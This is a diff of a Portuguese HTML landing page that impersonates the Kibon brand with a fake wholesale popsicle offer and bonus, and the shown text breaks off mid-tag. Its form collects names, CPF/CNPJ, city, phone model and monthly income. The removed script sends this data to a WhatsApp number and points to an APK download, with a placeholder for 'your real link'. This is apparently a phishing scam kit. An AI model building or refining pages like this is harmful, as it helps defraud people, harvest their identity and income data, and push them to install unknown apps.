@@ -3,86 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kibon Atacado - Picolés R$ 0,59</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
+    <title>Kibon Atacado - Promoção Ki Loucura R$ 0,59</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&family=Oswald:wght@700&display=swap" rel="stylesheet">
     <style>
-        :root { --kibon-red: #E2001A; --kibon-yellow: #FFD700; }
-        * { box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { background: #f0f2f5; margin: 0; padding: 10px; }
-        .container { background: #fff; width: 100%; max-width: 500px; margin: 10px auto; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); overflow: hidden; }
-        .header-flash { background: var(--kibon-red); color: #fff; text-align: center; padding: 15px; font-weight: 900; font-size: 16px; text-transform: uppercase; }
-        .main-header { padding: 30px 20px 10px; text-align: center; }
-        .logo-txt { font-size: 40px; font-weight: 900; color: var(--kibon-red); letter-spacing: -2px; margin: 0; }
-        .promo-box { background: var(--kibon-yellow); margin: 15px 10px; padding: 15px; border-radius: 15px; border: 2px dashed var(--kibon-red); }
-        .price-hero { font-size: 42px; color: var(--kibon-red); display: block; font-weight: 900; }
-        .form-section { padding: 20px; }
-        .input-group { margin-bottom: 12px; }
-        label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 4px; text-transform: uppercase; }
-        input { width: 100%; padding: 12px; border: 2px solid #eee; border-radius: 12px; font-size: 14px; outline: none; background: #fafafa; }
-        input:focus { border-color: var(--kibon-red); background: #fff; }
-        .btn-ready { width: 100%; padding: 20px; background: var(--kibon-red); color: #fff; border: none; border-radius: 50px; font-size: 18px; font-weight: 900; cursor: pointer; box-shadow: 0 10px 20px rgba(226, 0, 26, 0.4); margin-top: 10px; }
-        .catalog-title { background: #f8f8f8; padding: 15px; font-weight: 800; text-align: center; border-top: 1px solid #eee; }
-        .grid-picoles { padding: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .card-picole { border: 1px solid #eee; border-radius: 15px; padding: 10px; text-align: center; }
-        .card-picole img { width: 100%; height: 110px; object-fit: cover; border-radius: 10px; }
-        .picole-name { font-size: 12px; font-weight: 700; margin: 8px 0; color: #444; }
-        .atacadista-price { color: #2ecc71; font-weight: 900; font-size: 18px; }
-        .footer { padding: 20px; text-align: center; font-size: 10px; color: #bbb; }
+        :root {
+            --kibon-red: #E2001A;
+            --promo-yellow: #FFD700;
+            --promo-pink: #f26cb3;
+            --text-light: #FFFFFF;
+        }
+
+        * { box-sizing: border-box; font-family: 'Montserrat', sans-serif; margin: 0; padding: 0; }
+        
+        body {
+            background-color: #f0f2f5;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .atacadista-card {
+            background-color: var(--kibon-red);
+            width: 100%;
+            max-width: 500px;
+            border-radius: 30px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            overflow: hidden;
+            border: 4px solid var(--promo-yellow);
+        }
+
+        /* BANNER PROMOÇÃO ESTILO 'KI LOUCURA' */
+        .promo-banner-atacadista {
+            background-color: var(--kibon-red);
+            color: var(--text-light);
+            text-align: center;
+            padding: 20px 20px 10px;
+            text-transform: uppercase;
+        }
+
+        .promo-title-ki {
+            font-family: 'Oswald', sans-serif;
+            font-size: 16px;
+            color: var(--text-light);
+            letter-spacing: 1px;
+            font-weight: 700;
+        }
+
+        .promo-title-loucura {
+            font-family: 'Oswald', sans-serif;
+            font-size: 34px;
+            color: var(--promo-yellow);
+            font-weight: 700;
+            margin-top: -8px;
+            letter-spacing: -1px;
+            filter: drop-shadow(0 3px 0 var(--promo-pink));
+        }
+
+        .promo-subtitle-picolé {
+            font-size: 12px;
+            color: var(--promo-pink);
+            font-weight: 700;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+        }
+
+        /* ÁREA EXCLUSIVA DO PREÇO R$ 0,59 */
+        .hero-price-atacado {
+            background-color: #000;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+            margin: 10px;
+            border-radius: 15px;
+            border: 2px solid var(--promo-yellow);
+        }
+
+        .atacado-tag {
+            font-size: 11px;
+            color: var(--promo-yellow);
+            font-weight: 700;
+            letter-spacing: 2px;
+        }
+
+        .atacado-main-price {
+            font-size: 60px;
+            color: var(--text-light);
+            font-weight: 900;
+            display: block;
+            letter-spacing: -3px;
+        }
+
+        .bonus-info-label {
+            font-size: 10px;
+            color: var(--promo-pink);
+            font-weight: 600;
+        }
+
+        /* FORMULÁRIO PROFISSIONAL */
+        .revendedor-form {
+            background: rgba(255, 255, 255, 0.98);
+            padding: 20px 25px;
+            border-top: 1px solid #ddd;
+        }
+
+        .form-header-txt {
+            text-align: center;
+            font-weight: 800;
+            font-size: 16px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .revendedor-form .input-group { margin-bottom: 10px; }
+        .revendedor-form label { display: block; font-size: 10px; font-weight: 700; color: #555; margin-bottom: 3px; text-transform: uppercase; }
+        .revendedor-form input, select {
+            width: 100%; padding: 11px; border: 2px solid #eaeaea; border-radius: 8px;
+            font-size: 13px; outline: none; background: #fff; color: #333;
+        }
+        .revendedor-form input:focus { border-color: var(--kibon-red); }
+
+        .btn-comprar {
+            width: 100%; padding: 18px; background: var(--kibon-red); color: white;
+            border: none; border-radius: 50px; font-size: 16px; font-weight: 900;
+            cursor: pointer; box-shadow: 0 8px 15px rgba(226, 0, 26, 0.4);
+            transition: 0.3s; text-transform: uppercase; margin-top: 10px;
+        }
+        .btn-comprar:hover { transform: translateY(-2px); filter: brightness(1.1); }
+
+        .form-guarantee { text-align: center; font-size: 10px; color: #aaa; margin-top: 20px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header-flash">🔥 TABELA DE REVENDA LIBERADA 🔥</div>
-    <div class="main-header">
-        <p class="logo-txt">KIBON</p>
-        <div class="promo-box">
-            <h2 style="margin:0; font-size:16px;">Picolés no Atacado</h2>
-            <span class="price-hero">R$ 0,59</span>
-            <p style="font-size: 10px; margin: 5px 0 0;">Exclusivo para Novos Parceiros</p>
-        </div>
+<div class="atacadista-card">
+    
+    <div class="promo-banner-atacadista">
+        <div class="promo-title-ki">PROMOÇÃO</div>
+        <div class="promo-title-loucura">KILOUCURA</div>
+        <div class="promo-subtitle-picolé">DE PICOLÉ</div>
     </div>
 
-    <form class="form-section">
-        <div class="input-group"><label>Nome do Responsável</label><input type="text" id="nome" placeholder="Seu nome"></div>
-        <div class="input-group"><label>Nome do Comércio</label><input type="text" id="loja" placeholder="Nome da Loja"></div>
-        <div class="input-group"><label>CPF/CNPJ</label><input type="text" id="doc" placeholder="000.000.000-00"></div>
-        <div style="display:flex; gap:10px; margin-bottom:12px;">
-            <input type="text" id="cid" placeholder="Cidade" style="flex:2;">
-            <input type="text" id="uf" placeholder="UF" maxlength="2" style="flex:1;">
-        </div>
-        <div class="input-group"><label>Modelo do Celular</label><input type="text" id="cel" placeholder="Ex: iPhone 13"></div>
-        <div class="input-group"><label>Sua Renda Mensal</label><input type="text" id="ren" placeholder="R$ 0,00"></div>
-        <button type="button" class="btn-ready" onclick="enviar()">RESERVAR BÔNUS E BAIXAR APP</button>
-    </form>
-
-    <div class="catalog-title">Confira os Modelos (Unitário)</div>
-    <div class="grid-picoles">
-        <div class="card-picole">
-            <img src="https://images.unsplash.com/photo-1505394033343-e94c297a8a35?w=300">
-            <div class="picole-name">Picolé de Frutas</div>
-            <div class="atacadista-price">R$ 0,59</div>
-        </div>
-        <div class="card-picole">
-            <img src="https://images.unsplash.com/photo-1481391243133-f96216d51df7?w=300">
-            <div class="picole-name">Picolé de Leite</div>
-            <div class="atacadista-price">R$ 0,59</div>
-        </div>
+    <div class="hero-price-atacado">
+        <div class="atacado-tag">TABELA DE REVENDA</div>
+        <span class="atacado-main-price">R$ 0,59<small style="font-size:16px;"> un.</small></span>
+        <div class="bonus-info-label">*Bônus de R$ 500 para Novos Parceiros Ativo no App</div>
     </div>
-    <div class="footer">DISTRIBUIDORA KIBON BRASIL © 2026</div>
-</div>
 
-<script>
-    function enviar() {
-        const zap = "5554999422678";
-        const linkApk = "URL_DO_SEU_APK_AQUI"; // Coloque seu link real aqui
+    <form class="revendedor-form">
+        <div class="form-header-txt">Cadastro do Revendedor Oficial</div>
+        
+        <div class="input-group">
+            <label>Nome Completo do Titular</label>
+            <input type="text" id="nome_comercio" placeholder="Nome do responsável">
+        </div>
+        <div class="input-group">
+            <label>Nome do Comércio (Fantasia)</label>
+            <input type="text" id="comercio_nome" placeholder="Ex: Mercado da Esquina">
+        </div>
+        <div class="input-group">
+            <label>CPF ou CNPJ</label>
+            <input type="text" id="doc_fiscal" placeholder="000.000.000-00">
+        </div>
+        
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="cidade_at" placeholder="Cidade" style="flex:2;">
+            <input type="text" id="uf_at" placeholder="UF" maxlength="2" style="flex:1;">
+        </div>
 
-        const n = document.getElementById('nome').value;
-        const l = document.getElementById('loja').value;
-        const d = document.getElementById('doc').value;
-        const c = document.getElementById('cid').value;
-        const u = document.getElementById('uf').value;
-        const m = document.getElementById('cel').value;
-        const r = document.getElementById('ren').value;
-
-        if(!n || !l || !d) { alert("Preencha todos os campos!"); return; }
+        <div class="input-group" style="margin-top:10px;">
+            <label>Modelo do Celular (Para o App)</label>
+            <input type="text" id="aparelho_m" placeholder="Ex: Samsung A32">
+        </div>
+        <div class="input-group">
+            <label>Renda Mensal do Ponto</label>
+            <input type="text
